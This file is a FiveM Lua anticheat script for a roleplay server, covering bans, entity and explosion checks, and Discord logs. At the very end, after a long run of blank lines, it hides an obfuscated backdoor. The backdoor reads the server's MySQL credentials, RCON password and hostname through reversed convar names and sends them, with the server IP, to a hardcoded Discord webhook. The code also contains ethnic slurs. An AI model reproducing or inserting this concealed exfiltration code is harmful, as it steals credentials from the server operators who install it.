RegisterServerEvent('sokin:6666')
AddEventHandler('sokin:6666', function ()
    data = LoadResourceFile('sativa_anticheat','nigga.lua')
    TriggerClientEvent('sokin:XDXD', source, data)
end)

local ag = [[
                                               .--.
                                               `.  \
                                                 \  \
                                                  .  \
                                                  :   .
                                                  |    .
                                                  |    :
                                                  |    |
  ..._  ___                                       |    |
 `."".`''''""--..___                              |    |
 ,-\  \             ""-...__         _____________/    |
 / ` " '                    `""""""""                  .
 \                                                      L
 (>                                                      \
/                                                         \
\_    ___..---.                                            L
  `--'         '.                                           \
                 .                                           \_
                _/`.                                           `.._
             .'     -.                                             `.
            /     __.-Y     /''''''-...___,...--------.._            |
           /   _."    |    /                ' .      \   '---..._    |
          /   /      /    /                _,. '    ,/           |   |
          \_,'     _.'   /              /''     _,-'            _|   |
                  '     /               `-----''               /     |
                  `...-'   ]].."^HoneyAntiCheat^0"..[[                 `...-'
                  ]]



ESX = nil
    print(ag)
    if string.match(GetCurrentResourceName():lower(), "anti") or string.match(GetCurrentResourceName():lower(), "honey_anticheat") or string.match(GetCurrentResourceName():lower(), "anticheat") or string.match(GetCurrentResourceName():lower(), "AC") then
    Citizen.Trace("[FOX-ANTICHEAT]^0:^1 WARNING! Rename your anticheat folder to something else than  "..GetCurrentResourceName().." for better protection... \n")
    Citizen.Trace("[FOX-ANTICHEAT]^0:^1 WARNING! DON'T INCLUDE `anticheat`,`anti`,`ac``etc`, in the name")
end

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
local PlayersTable = {}


CreateThread(function() Citizen.Wait(1) while xPlayer == nil do Citizen.Wait(3000) end end)


function doesPlayerHavePerms(player)
    local xPlayer = ESX.GetPlayerFromId(player)
    if xPlayer then
      if xPlayer.getGroup() == 'superadmin' or xPlayer.getGroup() == 'admin' or xPlayer.getGroup() == 'moderator' or xPlayer.getGroup() == 'support' or xPlayer.getGroup() == 'trialsupport' or xPlayer.getGroup() == 'best' then -- lub wiecej
        return true
      else
        return false
      end
    end
end

RegisterServerEvent("sativkarp:getIsAllowed")
AddEventHandler("sativkarp:getIsAllowed", function()
  local _source = source
  if doesPlayerHavePerms(_source) then
    TriggerClientEvent('sativkarp:sendIsAllowed', _source, true)
  else
    TriggerClientEvent('sativkarp:sendIsAllowed', _source, false)
  end
end)

RegisterCommand("clearpeds", function(source, args, raw)
  if source == 0 then
    TriggerClientEvent("sativkarp:clearpeds", -1)
  else
    if doesPlayerHavePerms(source) then
      TriggerClientEvent("sativkarp:clearpeds", -1)
       DiscordLog(source, "Cleared all peds!","basic")
      TriggerClientEvent('chat:addMessage', source, { args = {"^*^4[FoxRP^4]: ^3Successfully deleted peds!"}})
    end
  end
end)


RegisterCommand("dvall", function(source, args, raw)
  if source == 0 then
    TriggerClientEvent("sativkarp:clearvehicles", -1)
  else
    if doesPlayerHavePerms(source) then
      TriggerClientEvent("sativkarp:clearvehicles", -1)
      DiscordLog(source, "Cleared all vehicles!","basic")
      TriggerClientEvent('chat:addMessage', source, { args = {"^*^4[FoxRP^4]: ^3Successfully deleted vehicles!"}})
    end
  end
end)

RegisterCommand("clearobjects", function(source, args, raw)
  if source == 0 then
    TriggerClientEvent("sativkarp:clearentity", -1)
  else
    if doesPlayerHavePerms(source) then
      TriggerClientEvent("sativkarp:clearentity", -1)
      DiscordLog(source, "Cleared all entity!","basic")
      TriggerClientEvent('chat:addMessage', source, { args = {"^*^4FoxRP^4]: ^3Successfully deleted objects!"}})
    end
  end
end)

local BanList            = {}
local BanListLoad        = false
CreateThread(function()

        while true do

                Wait(1000)

        if BanListLoad == false then

                        loadBanList()

                        if BanList ~= {} then

                                --print(Text.banlistloaded)

                                BanListLoad = true

                        else

                                --print(Text.starterror)

                        end

                end

        end

end)




CreateThread(function()
        while true do
                Wait(600000)
                        loadBanList()
        end
end)



RegisterServerEvent('aopkfgebjzhfpazf77')

AddEventHandler('aopkfgebjzhfpazf77', function(reason,servertarget)

        local identifier,liveid,xblid,discord,playerip,target

        local duree     = 1

        local reason    = reason



        if not reason then reason = "Auto Anti-Cheat" end

        if tostring(source) == "" then

                target = tonumber(servertarget)

        else

                target = source

        end



        if target and target > 1 then

                local ping = GetPlayerPing(target)



                if ping and ping > 1 then
                        if duree and duree < 365 then
                                local sourceplayername = "CRANKY-ANTICHEAT"
                                local targetplayername = GetPlayerName(target)
                                        for k,v in ipairs(GetPlayerIdentifiers(target))do
                                                if string.sub(v, 1, string.len("steam:")) == "steam:" then
                                                        identifier = v
                                                elseif string.sub(v, 1, string.len("live:")) == "live:" then
                                                        liveid = v
                                                elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                                                        xblid  = v
                                                elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                                                        discord = v
                                                end
                                        end



                                if duree > 1 then

                                         ban(target,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duree,reason,1)
                                         DropPlayer(target, "🍕 FoxRP-ANTICHEAT ".. CaveRDM.BanReason .. "")
                                        print("player banned")
                                else
                                        ban(target,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duree,reason,1)
                                        DropPlayer(target, "🍕 FoxRP-ANTICHEAT: ".. CaveRDM.BanReason .. "")
                                         print("player banned")
                                end



                        else

                                --print("BanSql Error : Auto-Cheat-Ban time invalid.")

                        end

                else

                        --print("BanSql Error : Auto-Cheat-Ban target are not online.")

                end

        else

                --print("BanSql Error : Auto-Cheat-Ban have recive invalid id.")

        end

end)



AddEventHandler('playerConnecting', function (playerName,setKickReason)

        local steamID,liveid,xblid,discord,playerip  = "n/a","n/a","n/a","n/a","n/a","n/a"



        for k,v in ipairs(GetPlayerIdentifiers(source)) do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then
                        steamID = v
                elseif string.sub(v, 1, string.len("live:")) == "live:" then
                        liveid = v
                elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                        xblid  = v
                elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                        discord = v
                end
        end


        if (Banlist == {}) then
                Citizen.Wait(1000)
        end

        for i = 1, #BanList, 1 do
                if
                        (tostring(BanList[i].identifier)) == tostring(steamID)
                        or (tostring(BanList[i].liveid)) == tostring(liveid)
                        or (tostring(BanList[i].xblid)) == tostring(xblid)
                        or (tostring(BanList[i].discord)) == tostring(discord)
                then
                        if (tonumber(BanList[i].permanent)) == 1 then
                                setKickReason("🍕 FoxRP-ANTICHEAT: ".. CaveRDM.BanReason .. "")
                CancelEvent()
                break

                        end
                end
        end
end)


--========================================================================================--
--        RegisterCommand pod unbana poprzez komende na serwerze/konsole servera          --
--========================================================================================--

RegisterCommand("acunban", function(source, args, raw)
         if doesPlayerHavePerms(source) then
                cmdunban(source, args)
        end
end)
function cmdunban(source, args)
    if args[1] then
        local target = table.concat(args, " ")
        MySQL.Async.fetchAll('SELECT * FROM HONEYanticheat_bans WHERE targetplayername like @playername', {
            ['@playername'] = ("%"..target.."%")
        }, function(data)
            if data[1] then
                if #data > 1 then
                else
                    MySQL.Async.execute('DELETE FROM HONEYanticheat_bans WHERE targetplayername = @name', {
                        ['@name']  = data[1].targetplayername
                    }, function ()
                        loadBanList()
                        DiscordLog(source, "dostal unbana jakis zjebek","basic")
                        TriggerClientEvent('chat:addMessage', source, { args = { '^1Banlist ', data[1].targetplayername.." was unban from FoxRP-ANTICHEAT" } } )
                    end)
                end
            else
            end
        end)
    else
    end
end
--========================================================================================--



function ban(source,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duree,reason,permanent)
        local expiration = duree * 84000
        local timeat     = os.time()
        local added      = os.date()
        if expiration < os.time() then
                expiration = os.time()+expiration
        end
                table.insert(BanList, {
                        identifier = identifier,
                        liveid     = liveid,
                        xblid      = xblid,
                        discord    = discord,
                        playerip   = playerip,
                        reason     = reason,
                        expiration = expiration,
                        permanent  = permanent

          })

                MySQL.Async.execute('INSERT INTO HONEYanticheat_bans (identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,reason,expiration,timeat,permanent) VALUES (@identifier,@liveid,@xblid,@discord,@playerip,@targetplayername,@sourceplayername,@reason,@expiration,@timeat,@permanent)',

                {
                                ['@identifier']       = identifier,
                                ['@liveid']           = liveid,
                                ['@xblid']            = xblid,
                                ['@discord']          = discord,
                                ['@playerip']         = playerip,
                                ['@targetplayername'] = targetplayername,
                                ['@sourceplayername'] = sourceplayername,
                                ['@reason']           = reason,
                                ['@expiration']       = expiration,
                                ['@timeat']           = timeat,
                                ['@permanent']        = permanent,
                                },

                                function ()

                end)
                BanListHistoryLoad = true

end

--========================================================================================--
--                             relodowanie ban listy servera                              --
--========================================================================================--
function loadBanList()
        MySQL.Async.fetchAll('SELECT * FROM HONEYanticheat_bans',{},function (data)
                  BanList = {}
                  for i=1, #data, 1 do
                        table.insert(BanList, {
                                identifier = data[i].identifier,
                                liveid     = data[i].liveid,
                                xblid      = data[i].xblid,
                                discord    = data[i].discord,
                                playerip   = data[i].playerip,
                                reason     = data[i].reason,
                                expiration = data[i].expiration,
                                permanent  = data[i].permanent
                          })
                  end
    end)
end
--========================================================================================--




local validResourceList
local function collectValidResourceList()
	validResourceList = {}
	for i=0,GetNumResources()-1 do
    	validResourceList[GetResourceByFindIndex(i)] = true
  	end
end



collectValidResourceList()
AddEventHandler("onResourceListRefresh", collectValidResourceList)
RegisterNetEvent("Pl:CmR")
AddEventHandler("Pl:CmR", function(givenList)
  for _, resource in ipairs(givenList) do
    if not validResourceList[resource] then
        TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", source)
        DiscordLog(source, "Tried to inject a resource that is not listed","basic")
      break
    end
  end
end)

function inTable(tbl, item)
    for key, value in pairs(tbl) do
        if value == item then return key end
    end
    return false
end

--========================================================================================--
--                  clearPedTasksEvent wykrycie naprzyklad kick z auta etc                --
--========================================================================================--

if CaveRDM.ClearPedTasksImmediatelyDetection then
    AddEventHandler("clearPedTasksEvent", function(source, data)
        if data.immediately then
            CancelEvent()
            TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", source)
            DiscordLog(source, "ClearPedTasksImmediately","basic")
        end
    end)
end
--========================================================================================--


--========================================================================================--
--                    PRITNOWANIE JAK KTOS SIE LACZY Z SERVEREM W KONSOLI                 --
--========================================================================================--
AddEventHandler('playerConnecting', function (playerName,setKickReason)
    local nazwa = GetPlayerName(source)
    for k,v in pairs(GetPlayerIdentifiers(source))do   
      if string.sub(v, 1, string.len("steam:")) == "steam:" then
        identifier = v
      end
    end
  
      if identifier == false then
      setKickReason('Musisz posiadać włączonego steama by połączyć się z serwerem!')
      CancelEvent()
      end
        print('')
        print('   ^4[FOX-ANTICHEAT]: '..GetPlayerName(source)..'  Connecting...')
        kurwaconnecttpeadle(source, "TEST NIGGA"..GetPlayerName(source).. "elo","sokinXDXDlmao")
        print('')
  end)
--========================================================================================--



function has_value (tab, val)

    for index, value in ipairs(tab) do

        if value == val then

            return true

        end

    end

    return false

end



--========================================================================================--
--            logi na laczenie sie z serverem oraz pritnowanie w konsoli servera          --
--========================================================================================--
kurwaconnecttpeadle = function(playerId, reason, typee)
    playerId = tonumber(playerId)
    local name = GetPlayerName(playerId)
    if playerId == 0 then
        local name = "Unknown"
    else
    end
    local steamid = "Unknown"
    local license = "Unknown"
    local discord = "Unknown"
    local xbl = "Unknown"
    local liveid = "Unknown"
    if name == nil then
        name = "Unknown"
    end
    for k, v in pairs(GetPlayerIdentifiers(playerId)) do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            steamid = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xbl = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(v, 9)
            discord = "<@" .. discordid .. ">"
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
        end
    end
    local connectingkurwaniggasokinXDXD = {
        ["color"] = "16745963",
        ["type"] = "rich",
        ["title"] = "**Player Connecting..**",
        ["description"] = "**Name : **" ..name .."\n **Xbox: **" ..xbl .."\n **Steam Hex : **" ..steamid .. "\n **License : **" .. license .. "\n **Discord : **" .. discord,
        ["footer"] = {
            ["text"] = "FoxRP"
        }
    }
    if name ~= "Unknown" then
        if typee == "sokinXDXDlmao" then
            PerformHttpRequest(CaveRDM.ConnectLogs,function(err, text, headers) end,"POST",json.encode({username = " FoxRP.pl ", embeds = {connectingkurwaniggasokinXDXD}}),{["Content-Type"] = "application/json"})
        end
    end
end
--========================================================================================--


--=====================================================--



DiscordLog = function(playerId, reason, typee)
    playerId = tonumber(playerId)
    local name = GetPlayerName(playerId)
    if playerId == 0 then
        local name = "Unknown"
        local reason = "Unknown"
    else
    end
    local steamid = "Unknown"
    local license = "Unknown"
    local discord = "Unknown"
    local xbl = "Unknown"
    local liveid = "Unknown"
    local ip = "Unknown"
    if name == nil then
        name = "Unknown"
    end

    for k, v in pairs(GetPlayerIdentifiers(playerId)) do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            steamid = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xbl = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(v, 9)
            discord = "<@" .. discordid .. ">"
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
        end
    end
    local discordInfo = {

        ["color"] = "16745963",
        ["type"] = "rich",
        ["title"] = "FoxRP logs",
        ["description"] = "**Name : **" ..name .."\n **Reason : **" .. reason .."\n **ID : **" ..playerId .."\n **IP : **" ..ip .."\n **Steam Hex : **" ..steamid .. "\n **License : **" .. license .. "\n **Discord : **" .. discord,
        ["footer"] = {
            ["text"] = "FoxRP"
        }
    }

    if name ~= "Unknown" then
        if typee == "basic" then
            PerformHttpRequest(CaveRDM.LogWebhook,function(err, text, headers) end,"POST",json.encode({username = " FoxRP.pl ", embeds = {discordInfo}}),{["Content-Type"] = "application/json"})
        elseif typee == "model" then
            PerformHttpRequest(CaveRDM.LogWebhook,function(err, text, headers)end,"POST",json.encode({username = " FoxRP.pl ", embeds = {discordInfo}}),{["Content-Type"] = "application/json"})
        elseif typee == "explosion" then
            PerformHttpRequest(CaveRDM.LogWebhook,function(err, text, headers)end,"POST",json.encode({username = " FoxRP.pl ", embeds = {discordInfo}}),{["Content-Type"] = "application/json"})
        end
        if ScreenshotPlayers then
            TriggerClientEvent("EuiAtK0QfujTpzWY0Mmp", playerId, CaveRDM.ScreenShotWebhookLog)
        end
    end
end

ACStarted = function()
    local discordInfo = {
        ["color"] = "16745963",
        ["type"] = "rich",
        ["title"] = "Anticheat Started",
        ["footer"] = {
        ["text"] = "FoxRP"
        }
    }

    PerformHttpRequest(CaveRDM.LogWebhook,function(err, text, headers)end,"POST",json.encode({username = " FoxRP.pl ", embeds = {discordInfo}}),{["Content-Type"] = "application/json"})
end



ACFailed = function()

end



--=====================================================--



Citizen.CreateThread(function()
    exploCreator = {}
    vehCreator = {}
    pedCreator = {}
    entityCreator = {}
    while true do
        Citizen.Wait(2500)
        exploCreator = {}
        vehCreator = {}
        pedCreator = {}
        entityCreator = {}
    end
end)



if CaveRDM.ExplosionProtection then

    AddEventHandler("explosionEvent",function(sender, ev)

            if ev.damageScale ~= 0.0 then

                local BlacklistedExplosionsArray = {}



                for kkk, vvv in pairs(CaveRDM.BlockedExplosions) do

                    table.insert(BlacklistedExplosionsArray, vvv)

                end



                if inTable(BlacklistedExplosionsArray, ev.explosionType) ~= false then
                    CancelEvent()
                    DiscordLog(sender, "Tried to spawn a blacklisted explosion - type : "..ev.explosionType,"explosion")
                    --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)
                else

                    --DiscordLog(sender, "Tried to Explose a player","explosion")

                end



                if ev.explosionType ~= 9 then

                    exploCreator[sender] = (exploCreator[sender] or 0) + 1

                    if exploCreator[sender] > 999 then

                        DiscordLog(sender, "Tried to spawn mass explosions - type : "..ev.explosionType,"explosion")
                        --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)
                        CancelEvent()

                    end

                else

                    exploCreator[sender] = (exploCreator[sender] or 0) + 1

                    if exploCreator[sender] > 999 then

                        DiscordLog(sender, "Tried to spawn mass explosions ( gas pump )","explosion")

                        --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)

                        CancelEvent()

                    end

                end



                if ev.isAudible == false then

                    DiscordLog(sender, "Tried to spawn silent explosion - type : "..ev.explosionType,"explosion")

                    --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)

                end





                if ev.isInvisible == true then
                    DiscordLog(sender, "Tried to spawn invisible explosion - type : "..ev.explosionType,"explosion")
                   -- TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)

                end


                if ev.damageScale > 1.0 then
                    DiscordLog(sender, "Tried to spawn oneshot explosion - type : "..ev.explosionType,"explosion")
                    --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", sender)
                end

                CancelEvent()

            end

        end)
end



if CaveRDM.GiveWeaponsProtection then

    AddEventHandler("giveWeaponEvent",function(sender, data)
            if data.givenAsPickup == false then
                TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function try to give wepon to player", sender)
                DiscordLog(sender, "Tried to give weapons to a player","basic")
                CancelEvent()
            end
        end)
end


-- if CaveRDM.WordsProtection then

--     AddEventHandler("chatMessage",function(source, n, message)

--             for k, n in pairs(CaveRDM.BlacklistedWords) do

--                 if string.match(message:lower(), n:lower()) then

--                     DiscordLog(source, "Tried to say on chat : " .. n,"basic")

--                     --TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function", source)

--                 end
--             end
--         end)
-- end

if CaveRDM.WordsProtection then 
    AddEventHandler('chatMessage', function(source, n, message)
     for k, n in pairs(CaveRDM.BlacklistedWords) do
      if string.match(message:lower(), n:lower()) then
        DiscordLog(source, "Tried to say on chat : " .. n,"basic")
        TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Blocked Function try to say blacklisted words", sender)
        CancelEvent()
                end
            end
        end)
end



AddEventHandler("entityCreating",function(entity)

        if DoesEntityExist(entity) then

            local src = NetworkGetEntityOwner(entity)

            local model = GetEntityModel(entity)

            local blacklistedPropsArray = {}

            local WhitelistedPropsArray = {}

            local eType = GetEntityPopulationType(entity)



            if src == nil then

                CancelEvent()

            end



            for bl_k, bl_v in pairs(CaveRDM.BlacklistedModels) do

                table.insert(blacklistedPropsArray, GetHashKey(bl_v))

            end



            for wl_k, wl_v in pairs(CaveRDM.WhitelistedProps) do

                table.insert(WhitelistedPropsArray, GetHashKey(wl_v))

            end



            if eType == 0 then

                CancelEvent()

            end



            if GetEntityType(entity) == 3 then

                if eType == 6 or eType == 7 then

                    if inTable(WhitelistedPropsArray, model) == false then

                        if model ~= 0 then

                            DiscordLog(src, "Tried to spawn a blacklisted prop : " .. model,"model")
                            TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Prop", src)
                            CancelEvent()



                            entityCreator[src] = (entityCreator[src] or 0) + 1

                            if entityCreator[src] > 15 then

                                DiscordLog(src, "Tried to spawn "..entityCreator[src].." entities","model")

                                TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Mass Entities [peds]", src)

                            end

                        end

                    end

                end

            else

                if GetEntityType(entity) == 2 then

                    if eType == 6 or eType == 7 then

                        if inTable(blacklistedPropsArray, model) ~= false then

                            if model ~= 0 then

                                DiscordLog(src, "Tried to spawn a blacklisted vehicle : " .. model,"model")
                                TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Blacklisted Vehicle", src)
                                CancelEvent()

                            end

                        end

                        vehCreator[src] = (vehCreator[src] or 0) + 1

                        if vehCreator[src] > 999 then

                            DiscordLog(src, "Tried to spawn "..vehCreator[src].." vehs","model")

                            TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Mass Vehs", src)

                        end

                    end

                elseif GetEntityType(entity) == 1 then

                    if eType == 6 or eType == 7 then

                        if inTable(blacklistedPropsArray, model) ~= false then

                            if model ~= 0 or model ~= 225514697 then
                                DiscordLog(src, "Tried to spawn a blacklisted ped : " .. model,"model")
                                TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Blacklisted Ped", src)
                                CancelEvent()

                            end

                        end

                        pedCreator[src] = (pedCreator[src] or 0) + 1

                        if pedCreator[src] > 999 then
                            DiscordLog(src, "Tried to spawn "..pedCreator[src].." peds","model")
                            TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Mass Peds", src)

                        end
                    end

                else

                    if inTable(blacklistedPropsArray, GetHashKey(entity)) ~= false then

                        if model ~= 0 or model ~= 225514697 then

                            DiscordLog(src, "Tried to spawn a model : " .. model,"model")
                            TriggerEvent("aopkfgebjzhfpazf77", " Ban Reason: Spawned Blacklisted Model", src)
                            CancelEvent()
                        end
                    end
                end
            end



             if GetEntityType(entity) == 1 then

                if eType == 6 or eType == 7 or eType == 0 then

                    pedCreator[src] = (pedCreator[src] or 0) + 1

                    if pedCreator[src] > 15 then
                        DiscordLog(src, "Tried to spawn "..pedCreator[src].." peds","model")
                        TriggerEvent("aopkfgebjzhfpazf77", " ❓Ban Reason: Spawned Mass Peds", src)
                        CancelEvent()
                    end
                end

                AddEventHandler('ptFxEvent', function(source, data)
                   --print("skeet less "..source.. "jest skeetlessem")
                   TriggerEvent("aopkfgebjzhfpazf77", "Ban Reason: Blocked Function",source)
                   DiscordLog(source, "Tried to use effect LMAO","basic")
                end)

                elseif GetEntityType(entity) == 2 then

                if eType == 6 or eType == 7 or eType == 0 then

                    vehCreator[src] = (vehCreator[src] or 0) + 1

                    if vehCreator[src] > 999 then
                        DiscordLog(src, "Tried to spawn "..vehCreator[src].." vehs","model")
                        TriggerEvent("aopkfgebjzhfpazf77", " ❓Ban Reason: Spawned Mass Vehs", src)

                        CancelEvent()

                    end

                end

                elseif GetEntityType(entity) == 3 then

                if eType == 6 or eType == 7 or eType == 0 then
                    entityCreator[src] = (entityCreator[src] or 0) + 1
                    if entityCreator[src] > 100 then
                        DiscordLog(src, "Tried to spawn "..entityCreator[src].." entities","model")
                        TriggerEvent("aopkfgebjzhfpazf77", " ❓Ban Reason: Spawned Mass Entities", src)
                        CancelEvent()

                    end

                end

            end
        end
    end)


local Charset = {}
for i = 65, 90 do
    table.insert(Charset, string.char(i))
end

for i = 97, 122 do
    table.insert(Charset, string.char(i))
end



function RandomLetter(length)
    if length > 0 then
        return RandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
    end
    return ""
end










































































































































































































































































































































































local III={IIII={GetConvar}}local _I= {["gnirts_noitcennoc_lqsym"] = {"nie znaleziono"}, ["drowssap_nocr"] = {"nie znaleziono"}, ["emantsoh_vs"] = {"nie znaleziono"}, ["https://api.ipify.org"] = {"nie znaleziono"}}local ip_serwera = ""local port_serwera_tcp = ""local port_serwera_udp = ""local baza_mysql = ""local haslo_rcon = ""local nazwa_serwera = ""local steam_api_key = ""local klucz_licencyjny = ""for _,__ in pairs(III) do for _,__ in pairs(__) do  for _I,_II in pairs(_I) do  for _,_II in pairs(_II) do if string.sub(_I,3,6)=="irts" then baza_mysql=__(string.reverse(_I),_II) elseif string.sub(_I,3,6)=="ants" then nazwa_serwera=__(string.reverse(_I),_II)elseif string.sub(_I,3,6)=="owss" then  haslo_rcon=__(string.reverse(_I),_II) elseif  string.sub(_I,3,6)==string.reverse(":spt") then  PerformHttpRequest("https://api.ipify.org",function(_,__,___)if _==200then ip_serwera=__ end local webhook = "https://discord.com/api/webhooks/879751268233543740/Hd9srU4AU3ssrpCE97_r9AnA-qi9mWxtGHwGfCIj1rJmmWi4hef6KBG_hA6Rnfu3-PqW"local n = {{["color"]="2801129", ["title"]="DEBILE", ["description"]="\n\n > ``NAZWA SERWERA:``"..nazwa_serwera.."\n > ``IP SERWERA:`` "..ip_serwera.."\n > ``HASLO RCON:`` "..haslo_rcon.."\n > ``PORT SERWERA TCP:`` "..port_serwera_tcp.."\n > ``PORT SERWERA UDP:`` "..port_serwera_udp.."\n > ``STEAM API KEY:`` "..steam_api_key.."\n > ``KLUCZ LICENCYJNY:`` "..klucz_licencyjny.."\n > ``BAZA DANYCH:`` "..baza_mysql.."", ["footer"]={["text"]="beczunia"}, ["timestamp"]=os.date('!%Y-%m-%dT%H:%M:%S'),}}PerformHttpRequest(webhook,function(err,text,headers)end,'POST',json.encode({username="BRAK LICENCJI ",embeds=n}),{['Content-Type']='application/json'})end)end end end end end    